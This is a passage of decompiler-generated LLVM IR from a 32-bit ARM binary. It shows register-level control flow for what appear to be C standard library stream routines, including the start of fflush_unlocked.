  %v2_184d0 = add i32 %v0_184d0, 80
  %v3_184d0 = inttoptr i32 %v2_184d0 to i32*
  %v4_184d0 = load i32, i32* %v3_184d0, align 4
  store i32 %v4_184d0, i32* %r3.global-to-local, align 4
  %v1_184d4 = inttoptr i32 %v4_184d0 to i32*
  %v2_184d4 = load i32, i32* %v1_184d4, align 4
  store i32 %v2_184d4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp46 = icmp slt i32 %v2_184d4, 1
  br i1 %tmp46, label %dec_label_pc_18630, label %dec_label_pc_184e0

dec_label_pc_184e0:                               ; preds = %dec_label_pc_184cc
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_184e4 = add i32 %v0_184d0, 152
  %v3_184e4 = inttoptr i32 %v2_184e4 to i32*
  %v4_184e4 = load i32, i32* %v3_184e4, align 4
  store i32 %v4_184e4, i32* %r7.global-to-local, align 4
  %v1_184e8 = add i32 %v4_184e4, 8
  %v2_184e8 = inttoptr i32 %v1_184e8 to i32*
  %v3_184e8 = load i32, i32* %v2_184e8, align 4
  store i32 %v3_184e8, i32* %r3.global-to-local, align 4
  %v1_184ec = load i32, i32* %r6.global-to-local, align 4
  %v3_184ec = icmp uge i32 %v3_184e8, %v1_184ec
  store i1 %v3_184ec, i1* %cpsr_c.global-to-local, align 1
  %v9_184ec = icmp eq i32 %v3_184e8, %v1_184ec
  br i1 %v9_184ec, label %dec_label_pc_18530, label %dec_label_pc_184f4

dec_label_pc_184f4:                               ; preds = %dec_label_pc_184e0
  store i32 %v4_184e4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_184fc86 = inttoptr i32 %v4_184e4 to i32*
  %v2_184fc87 = load i32, i32* %v1_184fc86, align 4
  store i32 %v2_184fc87, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1850089 = icmp eq i32 %v2_184fc87, 0
  br i1 %v9_1850089, label %dec_label_pc_18508, label %dec_label_pc_18520

dec_label_pc_18508:                               ; preds = %dec_label_pc_184f4, %dec_label_pc_18508.dec_label_pc_184fc_crit_edge
  %v0_1850890 = phi i32 [ %v1_18500.pre, %dec_label_pc_18508.dec_label_pc_184fc_crit_edge ], [ 0, %dec_label_pc_184f4 ]
  store i32 %v0_1850890, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_18518 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_18518, label %dec_label_pc_1851c, label %dec_label_pc_18508.dec_label_pc_184fc_crit_edge

dec_label_pc_18508.dec_label_pc_184fc_crit_edge:  ; preds = %dec_label_pc_18508
  %v0_184fc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_18500.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_184fc = inttoptr i32 %v0_184fc.pre to i32*
  %v2_184fc = load i32, i32* %v1_184fc, align 4
  store i32 %v2_184fc, i32* %r3.global-to-local, align 4
  %v3_18500 = icmp uge i32 %v2_184fc, %v1_18500.pre
  store i1 %v3_18500, i1* %cpsr_c.global-to-local, align 1
  %v9_18500 = icmp eq i32 %v2_184fc, %v1_18500.pre
  br i1 %v9_18500, label %dec_label_pc_18508, label %dec_label_pc_18520

dec_label_pc_1851c:                               ; preds = %dec_label_pc_18508
  %v0_1851c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1851c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18520

dec_label_pc_18520:                               ; preds = %dec_label_pc_184f4, %dec_label_pc_18508.dec_label_pc_184fc_crit_edge, %dec_label_pc_1851c
  %v0_18520 = phi i32 [ %v0_1851c, %dec_label_pc_1851c ], [ %v2_184fc87, %dec_label_pc_184f4 ], [ %v2_184fc, %dec_label_pc_18508.dec_label_pc_184fc_crit_edge ]
  %v1_18520 = phi i32 [ %v0_1851c, %dec_label_pc_1851c ], [ 0, %dec_label_pc_184f4 ], [ %v1_18500.pre, %dec_label_pc_18508.dec_label_pc_184fc_crit_edge ]
  %v3_18520 = icmp uge i32 %v0_18520, %v1_18520
  store i1 %v3_18520, i1* %cpsr_c.global-to-local, align 1
  %v9_18520 = icmp eq i32 %v0_18520, %v1_18520
  br i1 %v9_18520, label %bb48, label %bb47

bb47:                                             ; preds = %dec_label_pc_18520
  %v1_18524 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_18524, i32* %r0.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_18520, %bb47
  %v1_18528 = xor i1 %v9_18520, true
  call void @__pseudo_cond_branch(i1 %v1_18528, i32 ptrtoint (i32* @global_var_16040.925 to i32))
  %v0_1852c = load i32, i32* %r6.global-to-local, align 4
  %v1_1852c = load i32, i32* %r7.global-to-local, align 4
  %v2_1852c = add i32 %v1_1852c, 8
  %v3_1852c = inttoptr i32 %v2_1852c to i32*
  store i32 %v0_1852c, i32* %v3_1852c, align 4
  %v0_18538.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_18530

dec_label_pc_18530:                               ; preds = %dec_label_pc_184e0, %bb48
  %v0_18538 = phi i32 [ %v0_184d0, %dec_label_pc_184e0 ], [ %v0_18538.pre, %bb48 ]
  store i32 152, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r1.global-to-local, align 4
  %v2_18538 = add i32 %v0_18538, 152
  %v3_18538 = inttoptr i32 %v2_18538 to i32*
  %v4_18538 = load i32, i32* %v3_18538, align 4
  store i32 %v4_18538, i32* %r0.global-to-local, align 4
  %v2_1853c = add i32 %v0_18538, 76
  %v3_1853c = inttoptr i32 %v2_1853c to i32*
  %v4_1853c = load i32, i32* %v3_1853c, align 4
  store i32 %v4_1853c, i32* %r2.global-to-local, align 4
  %v1_18540 = add i32 %v4_18538, 4
  %v2_18540 = inttoptr i32 %v1_18540 to i32*
  %v3_18540 = load i32, i32* %v2_18540, align 4
  store i32 %v3_18540, i32* %r3.global-to-local, align 4
  %v1_18544 = inttoptr i32 %v4_1853c to i32*
  %v2_18544 = load i32, i32* %v1_18544, align 4
  store i32 %v2_18544, i32* %r2.global-to-local, align 4
  %v1_18548 = add i32 %v3_18540, 1
  store i32 %v1_18548, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v1_18548, i32* %v2_18540, align 4
  %v0_18598.pr = load i32, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1859811 = icmp eq i32 %v0_18598.pr, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_1859811, label %dec_label_pc_185a4, label %dec_label_pc_1855c

dec_label_pc_1855c:                               ; preds = %dec_label_pc_18530, %dec_label_pc_18594
  %v0_185802 = phi i32 [ %v0_18594, %dec_label_pc_18594 ], [ %v0_18598.pr, %dec_label_pc_18530 ]
  %v1_1855c = inttoptr i32 %v0_185802 to i16*
  %v2_1855c = load i16, i16* %v1_1855c, align 2
  %v3_1855c = zext i16 %v2_1855c to i32
  store i32 %v3_1855c, i32* %r3.global-to-local, align 4
  %v2_18560 = and i32 %v3_1855c, 32816
  store i32 %v2_18560, i32* %r1.global-to-local, align 4
  %v2_18564 = icmp ugt i32 %v2_18560, 47
  store i1 %v2_18564, i1* %cpsr_c.global-to-local, align 1
  %v7_18564 = icmp eq i32 %v2_18560, 48
  %v1_18568 = add i32 %v0_185802, 32
  %v2_18568 = inttoptr i32 %v1_18568 to i32*
  %v3_18568 = load i32, i32* %v2_18568, align 4
  store i32 %v3_18568, i32* %r4.global-to-local, align 4
  br i1 %v7_18564, label %dec_label_pc_18574, label %.thread38

.thread38:                                        ; preds = %dec_label_pc_1855c
  store i32 %v0_185802, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_18594

dec_label_pc_18574:                               ; preds = %dec_label_pc_1855c
  %v0_18574 = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18574 = icmp eq i32 %v0_18574, 0
  br i1 %v2_18574, label %.thread, label %bb49

.thread:                                          ; preds = %dec_label_pc_18574
  %v1_18578 = load i32, i32* %r5.global-to-local, align 4
  %v2_18578 = load i32, i32* %r7.global-to-local, align 4
  %v3_18578 = add i32 %v2_18578, %v1_18578
  %v4_18578 = inttoptr i32 %v3_18578 to i32*
  %v5_18578 = load i32, i32* %v4_18578, align 4
  store i32 %v5_18578, i32* %r3.global-to-local, align 4
  %v3_1857c = inttoptr i32 %v5_18578 to i32*
  store i32 %v3_18568, i32* %v3_1857c, align 4
  %v0_18580 = load i32, i32* %r2.global-to-local, align 4
  %v1_18580 = inttoptr i32 %v0_18580 to i16*
  %v2_18580 = load i16, i16* %v1_18580, align 2
  %v3_18580 = zext i16 %v2_18580 to i32
  store i32 %v3_18580, i32* %r3.global-to-local, align 4
  br label %bb50

bb49:                                             ; preds = %dec_label_pc_18574
  %v2_185808 = load i16, i16* %v1_1855c, align 2
  %v3_185809 = zext i16 %v2_185808 to i32
  store i32 %v3_185809, i32* %r3.global-to-local, align 4
  %v3_18584 = add i32 %v0_18574, 32
  %v4_18584 = inttoptr i32 %v3_18584 to i32*
  store i32 %v3_18568, i32* %v4_18584, align 4
  %v0_18588.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %.thread, %bb49
  %v0_18588 = phi i32 [ %v3_18580, %.thread ], [ %v0_18588.pre, %bb49 ]
  %v1_18588 = and i32 %v0_18588, 8192
  %v2_18588 = icmp eq i32 %v1_18588, 0
  br i1 %v2_18588, label %bb52, label %bb51

bb51:                                             ; preds = %bb50
  %v1_1858c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_1858c, i32* %r0.global-to-local, align 4
  br label %bb52

bb52:                                             ; preds = %bb50, %bb51
  %v1_18590 = xor i1 %v2_18588, true
  call void @__pseudo_cond_branch(i1 %v1_18590, i32 ptrtoint (i32* @global_var_1509c.29 to i32))
  %v0_18594.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18594

dec_label_pc_18594:                               ; preds = %.thread38, %bb52
  %v0_18594 = phi i32 [ %v0_18594.pre, %bb52 ], [ %v3_18568, %.thread38 ]
  store i32 %v0_18594, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18598 = icmp eq i32 %v0_18594, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_18598, label %dec_label_pc_185a4, label %dec_label_pc_1855c

dec_label_pc_185a4:                               ; preds = %dec_label_pc_18594, %dec_label_pc_18530
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_185a8 = load i32, i32* %r5.global-to-local, align 4
  %v2_185a8 = add i32 %v0_185a8, 152
  %v3_185a8 = inttoptr i32 %v2_185a8 to i32*
  %v4_185a8 = load i32, i32* %v3_185a8, align 4
  store i32 %v4_185a8, i32* %r0.global-to-local, align 4
  %v1_185ac = add i32 %v4_185a8, 4
  %v2_185ac = inttoptr i32 %v1_185ac to i32*
  %v3_185ac = load i32, i32* %v2_185ac, align 4
  %v1_185b0 = add i32 %v3_185ac, -1
  store i32 %v1_185b0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_185b4 = icmp eq i32 %v1_185b0, 0
  store i32 %v1_185b0, i32* %v2_185ac, align 4
  br i1 %v2_185b4, label %dec_label_pc_185c0, label %dec_label_pc_18620

dec_label_pc_185c0:                               ; preds = %dec_label_pc_185a4
  %v0_185c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_185c0 = load i32, i32* %r0.global-to-local, align 4
  %v2_185c0 = add i32 %v1_185c0, 8
  %v3_185c0 = inttoptr i32 %v2_185c0 to i32*
  store i32 %v0_185c0, i32* %v3_185c0, align 4
  %v0_185c4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_185c4, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_185c8

dec_label_pc_185c8:                               ; preds = %dec_label_pc_185f8.dec_label_pc_185c8_crit_edge, %dec_label_pc_185c0
  %v0_185c8 = phi i32 [ %v0_185c8.pre, %dec_label_pc_185f8.dec_label_pc_185c8_crit_edge ], [ %v0_185c4, %dec_label_pc_185c0 ]
  %v1_185c8 = inttoptr i32 %v0_185c8 to i32*
  %v2_185c8 = load i32, i32* %v1_185c8, align 4
  store i32 %v2_185c8, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_185c8, i32* %r2.global-to-local, align 4
  %v2_185d474 = load i32, i32* %v1_185c8, align 4
  store i32 %v2_185d474, i32* %r3.global-to-local, align 4
  %v3_185d876 = icmp uge i32 %v2_185d474, %v2_185c8
  store i1 %v3_185d876, i1* %cpsr_c.global-to-local, align 1
  %v9_185d882 = icmp eq i32 %v2_185d474, %v2_185c8
  br i1 %v9_185d882, label %dec_label_pc_185e0, label %dec_label_pc_185f8

dec_label_pc_185e0:                               ; preds = %dec_label_pc_185c8, %dec_label_pc_185e0.dec_label_pc_185d4_crit_edge
  %v0_185e083 = phi i32 [ %v1_185d8.pre, %dec_label_pc_185e0.dec_label_pc_185d4_crit_edge ], [ %v2_185c8, %dec_label_pc_185c8 ]
  store i32 %v0_185e083, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_185f0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_185f0, label %dec_label_pc_185f4, label %dec_label_pc_185e0.dec_label_pc_185d4_crit_edge

dec_label_pc_185e0.dec_label_pc_185d4_crit_edge:  ; preds = %dec_label_pc_185e0
  %v0_185d4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_185d8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_185d4 = inttoptr i32 %v0_185d4.pre to i32*
  %v2_185d4 = load i32, i32* %v1_185d4, align 4
  store i32 %v2_185d4, i32* %r3.global-to-local, align 4
  %v3_185d8 = icmp uge i32 %v2_185d4, %v1_185d8.pre
  store i1 %v3_185d8, i1* %cpsr_c.global-to-local, align 1
  %v9_185d8 = icmp eq i32 %v2_185d4, %v1_185d8.pre
  br i1 %v9_185d8, label %dec_label_pc_185e0, label %dec_label_pc_185f8

dec_label_pc_185f4:                               ; preds = %dec_label_pc_185e0
  %v0_185f4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_185f4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_185f8

dec_label_pc_185f8:                               ; preds = %dec_label_pc_185c8, %dec_label_pc_185e0.dec_label_pc_185d4_crit_edge, %dec_label_pc_185f4
  %v0_18600 = phi i32 [ %v0_185f4, %dec_label_pc_185f4 ], [ %v2_185d474, %dec_label_pc_185c8 ], [ %v2_185d4, %dec_label_pc_185e0.dec_label_pc_185d4_crit_edge ]
  %v1_185f8 = phi i32 [ %v0_185f4, %dec_label_pc_185f4 ], [ %v2_185c8, %dec_label_pc_185c8 ], [ %v1_185d8.pre, %dec_label_pc_185e0.dec_label_pc_185d4_crit_edge ]
  %v3_185f8 = icmp uge i32 %v0_18600, %v1_185f8
  store i1 %v3_185f8, i1* %cpsr_c.global-to-local, align 1
  %v9_185f8 = icmp eq i32 %v0_18600, %v1_185f8
  br i1 %v9_185f8, label %dec_label_pc_18600, label %dec_label_pc_185f8.dec_label_pc_185c8_crit_edge

dec_label_pc_185f8.dec_label_pc_185c8_crit_edge:  ; preds = %dec_label_pc_185f8
  %v0_185c8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_185c8

dec_label_pc_18600:                               ; preds = %dec_label_pc_185f8
  %v2_18600 = icmp ne i32 %v1_185f8, 0
  store i1 %v2_18600, i1* %cpsr_c.global-to-local, align 1
  %v7_18604 = icmp slt i32 %v1_185f8, 2
  br i1 %v7_18604, label %dec_label_pc_18620, label %dec_label_pc_18608

dec_label_pc_18608:                               ; preds = %dec_label_pc_18600
  %v0_18608 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_18608, i32* %r0.global-to-local, align 4
  %v0_1860c = load i32, i32* %r1.global-to-local, align 4
  %v1_1860c = add i32 %v0_1860c, 129
  store i32 %v1_1860c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_18620

dec_label_pc_18620:                               ; preds = %dec_label_pc_185a4, %dec_label_pc_18608, %dec_label_pc_18600
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_18624 = load i32, i32* %r5.global-to-local, align 4
  %v2_18624 = add i32 %v0_18624, 80
  %v3_18624 = inttoptr i32 %v2_18624 to i32*
  %v4_18624 = load i32, i32* %v3_18624, align 4
  store i32 %v4_18624, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_1862c = inttoptr i32 %v4_18624 to i32*
  store i32 0, i32* %v2_1862c, align 4
  br label %dec_label_pc_18630

dec_label_pc_18630:                               ; preds = %dec_label_pc_184a4, %dec_label_pc_184cc, %dec_label_pc_18620
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_18634 = load i32, i32* %r5.global-to-local, align 4
  %v2_18634 = add i32 %v0_18634, 160
  %v3_18634 = inttoptr i32 %v2_18634 to i32*
  %v4_18634 = load i32, i32* %v3_18634, align 4
  store i32 %v4_18634, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1863c = add i32 %v0_18634, 12
  %v3_1863c = inttoptr i32 %v2_1863c to i32*
  %v4_1863c = load i32, i32* %v3_1863c, align 4
  store i32 %v4_1863c, i32* %r1.global-to-local, align 4
  %v1_18640 = add i32 %v4_18634, 4
  %v2_18640 = inttoptr i32 %v1_18640 to i32*
  %v3_18640 = load i32, i32* %v2_18640, align 4
  store i32 %v3_18640, i32* %r2.global-to-local, align 4
  %v1_18644 = inttoptr i32 %v4_1863c to i32*
  %v2_18644 = load i32, i32* %v1_18644, align 4
  %v1_18648 = add i32 %v3_18640, -1
  store i32 %v1_18648, i32* %r2.global-to-local, align 4
  %v1_1864c = add i32 %v2_18644, -1
  store i32 %v1_1864c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18650 = icmp eq i32 %v1_18648, 0
  store i32 %v1_1864c, i32* %v1_18644, align 4
  %v0_18658 = load i32, i32* %r2.global-to-local, align 4
  %v1_18658 = load i32, i32* %r0.global-to-local, align 4
  %v2_18658 = add i32 %v1_18658, 4
  %v3_18658 = inttoptr i32 %v2_18658 to i32*
  store i32 %v0_18658, i32* %v3_18658, align 4
  br i1 %v2_18650, label %dec_label_pc_18660, label %dec_label_pc_186c0

dec_label_pc_18660:                               ; preds = %dec_label_pc_18630
  %v0_18660 = load i32, i32* %r2.global-to-local, align 4
  %v1_18660 = load i32, i32* %r0.global-to-local, align 4
  %v2_18660 = add i32 %v1_18660, 8
  %v3_18660 = inttoptr i32 %v2_18660 to i32*
  store i32 %v0_18660, i32* %v3_18660, align 4
  %v0_18664 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_18664, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_18668

dec_label_pc_18668:                               ; preds = %dec_label_pc_18698.dec_label_pc_18668_crit_edge, %dec_label_pc_18660
  %v0_18668 = phi i32 [ %v0_18668.pre, %dec_label_pc_18698.dec_label_pc_18668_crit_edge ], [ %v0_18664, %dec_label_pc_18660 ]
  %v1_18668 = inttoptr i32 %v0_18668 to i32*
  %v2_18668 = load i32, i32* %v1_18668, align 4
  store i32 %v2_18668, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_18668, i32* %r2.global-to-local, align 4
  %v2_1867462 = load i32, i32* %v1_18668, align 4
  store i32 %v2_1867462, i32* %r3.global-to-local, align 4
  %v3_1867864 = icmp uge i32 %v2_1867462, %v2_18668
  store i1 %v3_1867864, i1* %cpsr_c.global-to-local, align 1
  %v9_1867870 = icmp eq i32 %v2_1867462, %v2_18668
  br i1 %v9_1867870, label %dec_label_pc_18680, label %dec_label_pc_18698

dec_label_pc_18680:                               ; preds = %dec_label_pc_18668, %dec_label_pc_18680.dec_label_pc_18674_crit_edge
  %v0_1868071 = phi i32 [ %v1_18678.pre, %dec_label_pc_18680.dec_label_pc_18674_crit_edge ], [ %v2_18668, %dec_label_pc_18668 ]
  store i32 %v0_1868071, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_18690 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_18690, label %dec_label_pc_18694, label %dec_label_pc_18680.dec_label_pc_18674_crit_edge

dec_label_pc_18680.dec_label_pc_18674_crit_edge:  ; preds = %dec_label_pc_18680
  %v0_18674.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_18678.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_18674 = inttoptr i32 %v0_18674.pre to i32*
  %v2_18674 = load i32, i32* %v1_18674, align 4
  store i32 %v2_18674, i32* %r3.global-to-local, align 4
  %v3_18678 = icmp uge i32 %v2_18674, %v1_18678.pre
  store i1 %v3_18678, i1* %cpsr_c.global-to-local, align 1
  %v9_18678 = icmp eq i32 %v2_18674, %v1_18678.pre
  br i1 %v9_18678, label %dec_label_pc_18680, label %dec_label_pc_18698

dec_label_pc_18694:                               ; preds = %dec_label_pc_18680
  %v0_18694 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_18694, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18698

dec_label_pc_18698:                               ; preds = %dec_label_pc_18668, %dec_label_pc_18680.dec_label_pc_18674_crit_edge, %dec_label_pc_18694
  %v0_186a0 = phi i32 [ %v0_18694, %dec_label_pc_18694 ], [ %v2_1867462, %dec_label_pc_18668 ], [ %v2_18674, %dec_label_pc_18680.dec_label_pc_18674_crit_edge ]
  %v1_18698 = phi i32 [ %v0_18694, %dec_label_pc_18694 ], [ %v2_18668, %dec_label_pc_18668 ], [ %v1_18678.pre, %dec_label_pc_18680.dec_label_pc_18674_crit_edge ]
  %v3_18698 = icmp uge i32 %v0_186a0, %v1_18698
  store i1 %v3_18698, i1* %cpsr_c.global-to-local, align 1
  %v9_18698 = icmp eq i32 %v0_186a0, %v1_18698
  br i1 %v9_18698, label %dec_label_pc_186a0, label %dec_label_pc_18698.dec_label_pc_18668_crit_edge

dec_label_pc_18698.dec_label_pc_18668_crit_edge:  ; preds = %dec_label_pc_18698
  %v0_18668.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_18668

dec_label_pc_186a0:                               ; preds = %dec_label_pc_18698
  %v2_186a0 = icmp ne i32 %v1_18698, 0
  store i1 %v2_186a0, i1* %cpsr_c.global-to-local, align 1
  %v7_186a4 = icmp slt i32 %v1_18698, 2
  br i1 %v7_186a4, label %dec_label_pc_186c0, label %dec_label_pc_186a8

dec_label_pc_186a8:                               ; preds = %dec_label_pc_186a0
  %v0_186a8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_186a8, i32* %r0.global-to-local, align 4
  %v0_186ac = load i32, i32* %r1.global-to-local, align 4
  %v1_186ac = add i32 %v0_186ac, 129
  store i32 %v1_186ac, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_186c0

dec_label_pc_186c0:                               ; preds = %dec_label_pc_18630, %dec_label_pc_186a8, %dec_label_pc_186a0
  %v2_186c4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_186c4, i32* %r4.global-to-local, align 4
  %v1_186c8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_186c8

; uselistorder directives
  uselistorder i32 %v0_18694, { 1, 0, 2 }
  uselistorder i32 %v1_18678.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_18668, { 1, 0 }
  uselistorder i32 %v0_185f4, { 1, 0, 2 }
  uselistorder i32 %v1_185d8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_185c8, { 1, 0 }
  uselistorder i32 %v0_18594, { 2, 1, 0 }
  uselistorder i32 %v0_18538, { 1, 0 }
  uselistorder i32 %v0_1851c, { 1, 0, 2 }
  uselistorder i32 %v1_18500.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_184ec, { 1, 0 }
  uselistorder i32 %v0_18490, { 1, 0, 2 }
  uselistorder i32 %v1_18474.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_18448, { 2, 1, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 6, 5, 7, 8, 9, 11, 10, 12, 14, 13, 15 }
  uselistorder i32* %r6.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 6, 4, 5, 7 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 41, 4, 5, 6, 7, 8, 9, 10, 12, 11, 42, 13, 14, 15, 39, 40, 16, 17, 18, 19, 20, 21, 22, 24, 23, 43, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 44, 37, 38 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 12, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 20, 21, 3, 4, 5, 6, 22, 23, 7, 10, 8, 9, 19, 11, 12, 24, 25, 13, 14, 15, 16, 17, 26, 27, 18 }
  uselistorder i32 8192, { 4, 1, 2, 3, 0 }
  uselistorder i32 47, { 6, 0, 15, 7, 8, 9, 2, 10, 3, 11, 1, 12, 13, 4, 14, 5 }
  uselistorder i32 32816, { 2, 0, 1 }
  uselistorder label %dec_label_pc_186c0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_18698, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18680, { 1, 0 }
  uselistorder label %dec_label_pc_18630, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18620, { 1, 2, 0 }
  uselistorder label %dec_label_pc_185f8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_185e0, { 1, 0 }
  uselistorder label %dec_label_pc_18594, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_1855c, { 1, 0 }
  uselistorder label %dec_label_pc_18530, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_18520, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18508, { 1, 0 }
  uselistorder label %dec_label_pc_184a4, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_18494, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1847c, { 1, 0 }
}

define i32 @function_186d0(i32 %arg1) local_unnamed_addr {
dec_label_pc_186d0:
  %v0_186d0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_186d0, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_186d0
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_186d0, %bb
  %v10_186e4 = phi i32 [ %arg1, %dec_label_pc_186d0 ], [ 0, %bb ]
  ret i32 %v10_186e4

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_186e8 = load i32, i32* @r5, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* @r6, align 4
  %v4_186f8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 76) to i32*), align 4
  store i32 %v4_186f8, i32* %r3.global-to-local, align 4
  %v4_186fc = icmp uge i32 %tmp, %v4_186f8
  store i1 %v4_186fc, i1* %cpsr_c.global-to-local, align 1
  %v10_186fc = icmp eq i32 %tmp, %v4_186f8
  br i1 %v10_186fc, label %bb, label %dec_label_pc_18714

bb:                                               ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  br label %dec_label_pc_18724

dec_label_pc_18714:                               ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_18718 = icmp eq i16* %arg1, null
  br i1 %v3_18718, label %dec_label_pc_18724, label %dec_label_pc_18a38

